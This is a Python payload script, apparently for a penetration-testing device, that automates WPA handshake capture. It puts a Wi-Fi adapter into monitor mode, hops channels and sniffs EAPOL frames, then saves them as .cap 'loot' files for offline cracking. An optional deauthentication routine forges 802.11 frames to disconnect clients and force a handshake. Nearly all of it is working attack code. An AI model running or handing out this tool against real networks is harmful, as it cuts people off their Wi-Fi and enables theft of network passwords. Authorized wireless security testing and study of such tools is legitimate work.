#!/usr/bin/env python3
# @active: true
# @web: true
# @name: Automatic WiFi Handshake Capture
# @desc: Hop 2.4 GHz channels on a selected monitor interface, detect EAPOL exchanges, optionally assist with bounded deauthentication, and save handshake captures to loot.
# @category: wifi
# @danger: true
# @inputs: [{"name":"seconds","label":"Maximum channel-hopping capture duration in seconds","type":"number","default":"120"},{"name":"deauth","label":"Optional client reconnection assistance","type":"select","choices":[{"value":"false","label":"Passive only — capture naturally occurring WPA handshakes"},{"value":"true","label":"Deauthentication assist — send bounded frames on authorized targets to prompt reconnection"}],"default":"false"}]

import os
import sys
import time
import threading
import subprocess
import copy
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces, supports_monitor
from payloads._web_input import request_input

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11AssoResp, Dot11Deauth,
        Dot11Auth, EAPOL, RadioTap, sendp, wrpcap,
        sniff as scapy_sniff, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ── Constants ────────────────────────────────────────────────────────────────
LOOT_DIR = os.path.join(os.environ["CITYPOP_LOOT"], "Handshakes")
CHANNELS_24 = list(range(1, 14))
ROWS_VISIBLE = 6
ROW_H = 12
DEAUTH_TIMEOUT = 10      # seconds before deauth assist
HANDSHAKE_EAPOL_MIN = 2  # minimum EAPOL frames to call it a capture

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
capturing = False
mon_iface = None
deauth_enabled = True
scroll_pos = 0
status_msg = "Idle"
_running = True
_selected_iface = None

# Per-BSSID tracking
# bssid -> {ssid, channel, eapol_pkts: [], first_seen, deauthed, saved_path}
targets = {}
captures = []   # [{bssid, ssid, path, ts, eapol_count}]
ap_channels = {}  # bssid -> channel (from beacons)


# ── Onboard WiFi detection ──────────────────────────────────────────────────

def _is_onboard_wifi_iface(iface):
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_external_wifi():
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not os.path.isdir(f"/sys/class/net/{name}/wireless"):
                continue
            if not supports_monitor(name):
                continue
            return name
    except Exception:
        pass
    return None


def _select_monitor_interface():
    ifaces = [item for item in list_interfaces("wifi") if item.get("supports_monitor")]
    if not ifaces:
        print("No monitor-capable Wi-Fi interface found", flush=True)
        return None
    print("Available monitor-capable interfaces:", flush=True)
    choices = []
    for item in ifaces:
        name = item["name"]
        bus = item.get("bus") or ("onboard" if item.get("is_onboard") else "external")
        state = "up" if item.get("is_up") else "down"
        print(f"  {name}: {bus}, {state}", flush=True)
        choices.append({"value": name, "label": f"{name} · {bus} · {state}"})
    selected = str(request_input(
        "Select monitor-capable Wi-Fi interface",
        input_type="select",
        choices=choices,
    ))
    if selected not in {item["name"] for item in ifaces}:
        print("Invalid interface selection", flush=True)
        return None
    return selected


# ── Monitor mode helpers ────────────────────────────────────────────────────

def _enable_monitor(iface):
    # Kill interfering processes first (NetworkManager, wpa_supplicant, etc.)
    subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                   capture_output=True, timeout=10)
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    result = subprocess.run(["sudo", "iw", iface, "set", "type", "monitor"],
                            capture_output=True, text=True, timeout=5)
    if result.returncode != 0:
        print(f"[handshake_auto] monitor mode failed: {result.stderr.strip()}")
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)
    # Verify monitor mode was set
    verify = subprocess.run(["sudo", "iw", "dev", iface, "info"],
                            capture_output=True, text=True, timeout=5)
    if "monitor" not in verify.stdout.lower():
        print(f"[handshake_auto] WARNING: {iface} may not be in monitor mode")
    return iface


def _disable_monitor(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", iface, "set", "type", "managed"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=5)
        # Restart NetworkManager if available so system WiFi recovers
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"],
                       capture_output=True, timeout=10)
    except Exception:
        pass


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ── Deauth helper ───────────────────────────────────────────────────────────

def _send_deauth(bssid, client_mac, iface):
    """Send a single deauth frame to trigger re-authentication."""
    if not SCAPY_OK:
        return
    pkt = (RadioTap()
           / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
           / Dot11Deauth(reason=7))
    try:
        sendp(pkt, iface=iface, count=3, inter=0.05, verbose=False)
    except Exception:
        pass


# ── Save capture ─────────────────────────────────────────────────────────────

def _save_capture(bssid, info):
    """Save EAPOL packets as a .cap file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ssid = "".join(c if c.isalnum() or c in "_-" else "_"
                        for c in (info.get("ssid", "") or "unknown"))
    fname = f"hs_{safe_ssid}_{ts}.cap"
    path = os.path.join(LOOT_DIR, fname)
    try:
        wrpcap(path, info["eapol_pkts"])
    except Exception:
        return None
    entry = {
        "bssid": bssid,
        "ssid": info.get("ssid", "?"),
        "path": path,
        "ts": ts,
        "eapol_count": len(info["eapol_pkts"]),
    }
    with lock:
        captures.append(entry)
    return path


# ── Packet handler ──────────────────────────────────────────────────────────

def _pkt_handler(pkt):
    global status_msg

    if not pkt.haslayer(Dot11):
        return

    # Track AP channels from beacons
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        elt = pkt[Dot11Elt]
        ch = 0
        while elt:
            if elt.ID == 3 and elt.info:
                ch = elt.info[0]
                break
            elt = (elt.payload if hasattr(elt, "payload")
                   and isinstance(elt.payload, Dot11Elt) else None)
        ssid = ""
        elt2 = pkt[Dot11Elt]
        if elt2 and elt2.ID == 0 and elt2.info:
            try:
                ssid = elt2.info.decode("utf-8", errors="replace")
            except Exception:
                pass
        if bssid and ch:
            with lock:
                ap_channels[bssid] = ch
                if bssid in targets and not targets[bssid].get("ssid"):
                    targets[bssid] = {**targets[bssid], "ssid": ssid}

    # Association response -> new target
    if pkt.haslayer(Dot11AssoResp):
        bssid = (pkt[Dot11].addr2 or "").upper()
        client = (pkt[Dot11].addr1 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        with lock:
            if bssid not in targets:
                ch = ap_channels.get(bssid, 0)
                targets[bssid] = {
                    "ssid": "", "channel": ch,
                    "eapol_pkts": [], "first_seen": time.time(),
                    "deauthed": False, "client": client,
                    "saved_path": None,
                }
                status_msg = f"Track: {bssid[-8:]}"

    # EAPOL frame -> capture
    if pkt.haslayer(EAPOL):
        bssid = None
        ds = pkt[Dot11].FCfield & 0x3
        if ds == 1:
            bssid = (pkt[Dot11].addr1 or "").upper()
        elif ds == 2:
            bssid = (pkt[Dot11].addr2 or "").upper()
        else:
            bssid = (pkt[Dot11].addr3 or "").upper()

        if not bssid:
            return

        with lock:
            if bssid in targets:
                info = targets[bssid]
                new_pkts = list(info["eapol_pkts"]) + [pkt]
                targets[bssid] = {**info, "eapol_pkts": new_pkts}
                status_msg = f"EAPOL {bssid[-8:]}:{len(new_pkts)}"

                if len(new_pkts) >= HANDSHAKE_EAPOL_MIN and not info.get("saved_path"):
                    # Save in a separate thread to avoid blocking sniff
                    save_info = dict(targets[bssid])
                    targets[bssid] = {**targets[bssid], "saved_path": "pending"}
                    threading.Thread(
                        target=_save_capture,
                        args=(bssid, save_info),
                        daemon=True,
                    ).start()


# ── Deauth assist thread ────────────────────────────────────────────────────

def _deauth_assist_thread():
    """Check tracked BSSIDs and send deauth if no EAPOL after timeout."""
    while True:
        with lock:
            if not capturing:
                break
            de = deauth_enabled
            iface = mon_iface
            tgts = dict(targets)

        if not de or not iface:
            time.sleep(1)
            continue

        now = time.time()
        for bssid, info in tgts.items():
            if info.get("deauthed") or info.get("saved_path"):
                continue
            if not info.get("eapol_pkts") and (now - info["first_seen"]) > DEAUTH_TIMEOUT:
                client = info.get("client", "ff:ff:ff:ff:ff:ff")
                ch = info.get("channel", 0) or ap_channels.get(bssid, 0)
                if ch and iface:
                    _set_channel(iface, ch)
                    time.sleep(0.1)
                    _send_deauth(bssid, client, iface)
                    with lock:
                        if bssid in targets:
                            targets[bssid] = {**targets[bssid], "deauthed": True}

        time.sleep(2)


# ── Channel hopping ─────────────────────────────────────────────────────────

def _channel_hop():
    global status_msg
    idx = 0
    while True:
        with lock:
            if not capturing:
                break
            iface = mon_iface
        if not iface:
            break
        try:
            _set_channel(iface, CHANNELS_24[idx])
        except Exception as e:
            print(f"[handshake_auto] channel hop error: {e}")
            with lock:
                status_msg = f"Ch hop err: {type(e).__name__}"
            break
        idx = (idx + 1) % len(CHANNELS_24)
        time.sleep(0.3)


def _sniff_thread():
    global status_msg
    with lock:
        iface = mon_iface
    if not iface:
        with lock:
            status_msg = "ERR: no iface"
        return
    try:
        scapy_sniff(
            iface=iface, prn=_pkt_handler, store=False,
            stop_filter=lambda _: not capturing,
        )
    except PermissionError as e:
        print(f"[handshake_auto] sniff permission error: {e}")
        with lock:
            status_msg = "ERR: need root"
    except OSError as e:
        print(f"[handshake_auto] sniff OS error: {e}")
        with lock:
            status_msg = f"ERR: {str(e)[:18]}"
    except Exception as e:
        print(f"[handshake_auto] sniff error: {e}")
        with lock:
            status_msg = f"Sniff err: {type(e).__name__}"


# ── Start / stop ─────────────────────────────────────────────────────────────

def _start_capture():
    global capturing, mon_iface, status_msg
    ext = _selected_iface
    if not ext:
        with lock:
            status_msg = "No USB WiFi"
        return
    if not SCAPY_OK:
        with lock:
            status_msg = "pip install scapy"
        return

    with lock:
        status_msg = f"Setting monitor..."
    iface = _enable_monitor(ext)

    # Verify monitor mode before starting threads
    verify = subprocess.run(["sudo", "iw", "dev", iface, "info"],
                            capture_output=True, text=True, timeout=5)
    if "monitor" not in verify.stdout.lower():
        with lock:
            status_msg = "Monitor mode FAIL"
        _disable_monitor(iface)
        return

    with lock:
        mon_iface = iface
        capturing = True
        status_msg = f"Capture on {iface}"
        # Reset tracking state for a fresh capture session
        targets.clear()
        ap_channels.clear()

    threading.Thread(target=_channel_hop, daemon=True, name="chan_hop").start()
    threading.Thread(target=_sniff_thread, daemon=True, name="sniff").start()
    threading.Thread(target=_deauth_assist_thread, daemon=True, name="deauth").start()


def _stop_capture():
    global capturing, status_msg
    with lock:
        capturing = False
        iface = mon_iface
        status_msg = "Stopped"
    time.sleep(0.5)
    if iface:
        _disable_monitor(iface)


# ── Export all ───────────────────────────────────────────────────────────────

def _export_all():
    """Save any unsaved targets that have EAPOL packets."""
    saved = 0
    with lock:
        tgts = dict(targets)
    for bssid, info in tgts.items():
        if info["eapol_pkts"] and not info.get("saved_path"):
            path = _save_capture(bssid, info)
            if path:
                with lock:
                    if bssid in targets:
                        targets[bssid] = {**targets[bssid], "saved_path": path}
                saved += 1
    return saved


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    global deauth_enabled, _selected_iface
    _selected_iface = _select_monitor_interface()
    if not _selected_iface:
        return 1
    try:
        duration = float(sys.argv[1]) if len(sys.argv) > 1 else 120.0
    except ValueError:
        print("seconds must be numeric", flush=True)
        return 2
    if not 1 <= duration <= 3600:
        print("seconds must be between 1 and 3600", flush=True)
        return 2
    deauth_enabled = len(sys.argv) > 2 and sys.argv[2].lower() == "true"
    if not SCAPY_OK:
        print("scapy is required", flush=True)
        return 127
    print(f"Capturing on {_selected_iface} for {duration:g}s; deauth={deauth_enabled}", flush=True)
    try:
        _start_capture()
        deadline = time.monotonic() + duration
        while time.monotonic() < deadline:
            time.sleep(min(5, deadline - time.monotonic()))
            with lock:
                print(f"targets={len(targets)} captures={len(captures)}", flush=True)
    except KeyboardInterrupt:
        print("Stopping capture", flush=True)
    finally:
        _stop_capture()
    saved = _export_all()
    print(f"Complete: captures={len(captures)} additional_exports={saved}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
